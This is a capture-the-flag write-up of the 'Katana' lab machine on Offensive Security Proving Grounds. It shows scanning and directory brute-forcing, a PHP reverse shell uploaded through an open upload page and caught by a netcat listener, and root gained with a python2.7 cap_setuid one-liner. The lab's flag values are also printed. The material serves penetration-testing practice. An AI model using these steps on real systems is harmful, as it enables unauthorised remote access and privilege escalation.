---
title: Offsec-PG[KATANA]
author: Anurag M
date: 2021-09-17 22:30:00 +0800
categories: [Offsec-PG]
tags: [ offsec-pg, capabilities, SUID, upload, gobuster ]
---

![katana](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/katana/katana.png)

Katana is a boot2root linux machine hosted on Offensive Security Playing Grounds, originally from VulnHub.

## About The Machine

| Name | OS | Difficulty |
|------|----|------------|
| Katana | Linux | Easy |

## Reconnaissance
### Nmap

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/katana]
└──╼ $nmap -sC -sV -p- 192.168.174.83
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-17 18:20 IST
Nmap scan report for 192.168.174.83
Host is up (0.37s latency).
Not shown: 65527 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)
|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)
|_  256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Katana X
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
7080/tcp open  ssl/http    LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Katana X
| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US
| Not valid before: 2021-05-11T13:57:36
|_Not valid after:  2022-05-11T13:57:36
|_ssl-date: 2020-05-19T20:23:01+00:00; +1s from scanner time.
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
8088/tcp open  http        LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Katana X
8715/tcp open  http        nginx 1.14.2
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-server-header: nginx/1.14.2
|_http-title: 401 Authorization Required
MAC Address: 00:0C:29:7E:18:F9 (VMware)
Service Info: Host: KATANA; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

As there are many open ports, started enumerating each port starting with `FTP` and `Samba shares`. `FTP` doesn't allow anonymous access. And there are no public network shares.

### HTTP

Since port 80 is open, started exploring HTTP service. But couldn't find anything on port 80. Just a simple landing page.

![katana](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/katana/1.png)

Going deeper, started brute-force attack on port 80 to find hidden directories using `gobuster`, but still couldn't find anything.

To find a way in started exploring other open ports `8088`, `8715`.
Enumerating directories with `gobuster` revealed an interesting `upload` function on port `8088`.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/katana]
└──╼ $gobuster dir -k -u http://192.168.174.83:8088/ -w /usr/share/wordlists/dirb/common.txt -x html,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.174.83:8088/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
2021/09/17 18:33:36 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 1227]
/blocked              (Status: 301) [Size: 1260] [--> http://192.168.174.83:8088/blocked/]
/cgi-bin              (Status: 301) [Size: 1260] [--> http://192.168.174.83:8088/cgi-bin/]
/css                  (Status: 301) [Size: 1260] [--> http://192.168.174.83:8088/css/]    
/docs                 (Status: 301) [Size: 1260] [--> http://192.168.174.83:8088/docs/]   
/error404.html        (Status: 200) [Size: 195]                                           
/img                  (Status: 301) [Size: 1260] [--> http://192.168.174.83:8088/img/]    
/index.html           (Status: 200) [Size: 655]                                           
/index.html           (Status: 200) [Size: 655]                                           
/phpinfo.php          (Status: 200) [Size: 50739]                                         
/phpinfo.php          (Status: 200) [Size: 50739]                                         
/protected            (Status: 301) [Size: 1260] [--> http://192.168.174.83:8088/protected/]
/upload.html          (Status: 200) [Size: 6480]  <-----File Upload Page                                          
/upload.php           (Status: 200) [Size: 1800]                                            
                                                                                            
===============================================================
2021/09/17 18:44:02 Finished
===============================================================

```
Browsing to the page, we can see the page has `two` file upload options.

![katana](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/katana/3.png)

Let's try to upload a shell. We can use [pentestermonkey's](https://github.com/pentestmonkey/php-reverse-shell) php reverse shell.

![katana](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/katana/4.png)

After successfully uploading the file, we get a message that the file we uploaded was internally redirected to another directory. We could also notice that the file name was also changed.

![katana](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/katana/5.png)

## Gaining Foothold

We are provided with a new file name `katana_shell.php`, but the file doesn't seem to be served at port `8088`. Searching for the file on other open ports revealed that the file is being served at port `8715`. This explains the internal redirection of the file while uploading.

Now let us start our netcat listener on the specified port.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/katana]
└──╼ $nc -nlvp 4444
listening on [any] 4444 ...
```

Let's trigger our reverse shell browsing to the url `http://192.168.174.83:8715/katana_shell.php`.

![katana](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/katana/6.png)

Few seconds later I got a shell back on my netcat listener.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/offsec-PG/katana]
└──╼ $nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.49.174] from (UNKNOWN) [192.168.174.83] 39846
Linux katana 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
 09:20:01 up 34 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

Now let's upgrade to a stable shell.

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@katana:/$ export TERM=xterm
export TERM=xterm
www-data@katana:/$
```
First flag can be found in the `/var/www` directory.

```bash
www-data@katana:/var/www$ ls
ls
html  local.txt
www-data@katana:/var/www$ cat local.txt
cat local.txt
54aa457b045ab4951fcc3c3e2cce9f75
www-data@katana:/var/www$
```

## Privilege Escalation

Enumerating the box for privilege escalation, we can find that `python2.7` has suid capabilities.
Capabilities are like the `SUID` but may limit user's permission and more.
Here is an interesting article about privilege escalation using capabilities.

[Privilege Escalation Using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

```bash
www-data@katana:/home/katana$ /sbin/getcap -r / 2>/dev/null
/sbin/getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep
```

Let's check [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities)

![katana](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/katana/7.png)

It's time to get root shell.

```bash
www-data@katana:/home/katana$ python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@katana:/home/katana# 
```

The root flag can be found in `root` directory.

```bash
root@katana:/root# ls -la
ls -la
total 40
drwx------  4 root root 4096 Sep 17 08:47 .
drwxr-xr-x 18 root root 4096 Jul  3  2020 ..
-rw-------  1 root root  103 Mar 10  2021 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 May 11  2020 .gnupg
drwxr-xr-x  3 root root 4096 Aug 20  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 May 11  2020 .selected_editor
-rw-r--r--  1 root root   33 Sep 17 08:48 proof.txt
-rw-r--r--  1 root root   32 Aug 20  2020 root.txt
root@katana:/root# cat proof.txt
cat proof.txt
f17e77872294bd15606b5a1b1e8aaaff
root@katana:/root#
```
## Resources

| Topic | Url |
|-------|-----|
| GTFOBins-Python Capabilities | [Click here](https://gtfobins.github.io/gtfobins/python/#capabilities) |
| Reverse Shell | [Click here](https://github.com/pentestmonkey/php-reverse-shell) |
